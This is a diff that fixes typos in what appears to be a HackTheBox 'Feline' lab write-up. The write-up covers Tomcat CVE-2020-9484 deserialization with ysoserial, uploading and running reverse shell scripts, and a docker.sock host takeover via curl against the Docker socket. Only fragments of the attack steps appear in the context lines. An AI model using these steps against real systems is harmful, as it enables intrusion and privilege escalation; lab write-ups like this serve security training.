@@ -11,7 +11,7 @@ tags: [Lab, HackTheBox]
   - [Initial：](#initial)
     - [Recon NMAP](#recon-nmap)
     - [CVE in 2020](#cve-in-2020)
-  - [Gain acess to shell](#gain-acess-to-shell)
+  - [Gain access to shell](#gain-access-to-shell)
     - [Port 8080](#port-8080)
     - [burpsuite the request](#burpsuite-the-request)
     - [Apache Tomcat 9.0.27 vulnerability CVE - 2020 - 9484](#apache-tomcat-9027-vulnerability-cve---2020---9484)
@@ -60,7 +60,7 @@ tags: [Lab, HackTheBox]
 
 9. create executefile.session
    - bash /tmp/targetplay.sh
-   - (exccute the targetplay.sh)
+   - (execute the targetplay.sh)
 
 10. create curlcommand.sh
     - send curl command with the cookie and malicious files.
@@ -136,7 +136,7 @@ Microsoft CVE-2020-16937: .NET Framework Information Disclosure Vulnerability
 
 ---
 
-## Gain acess to shell
+## Gain access to shell
 
 
 ---
@@ -262,7 +262,7 @@ play1.sh (reverse shell code)
 
 uploadfile.session (upload the reverse shell code and store ie in /tmp/targetplay.sh)
 
-executefile.session (exccute the targetplay.sh)
+executefile.session (execute the targetplay.sh)
 
 
 
@@ -276,7 +276,7 @@ executefile.session (exccute the targetplay.sh)
 
 2. download the ysoserial source code
    - [使用github上的ysoserial工具](https://github.com/frohoff/ysoserial)
-   - download the lastest jar from [JitPack](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)
+   - download the latest jar from [JitPack](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)
 
     ```bash
     git clone https://github.com/frohoff/ysoserial.git
@@ -338,7 +338,7 @@ vim run.sh
 ####################################################################################
 # Hackthebox "Feline" deserializtion attack
 #####################################################################################
-#set command line paramters
+#set command line parameters
 ip=$1
 port=$2
 #reverse shell command the trget will execute
@@ -453,9 +453,9 @@ curl -s --unix-socket /var/run/docker.sock http://localhost/image/json
 Docker.sock exploit
 - Node takeover
 
-- mount the host/fileystem on the new container
+- mount the host/fileysystem on the new container
 - container execute command whrn started
-- we can mount the root ds and execute recerse shell when teh container is started
+- we can mount the root ds and execute recerse shell when the container is started
 - `Engine API v1.24`
 
 
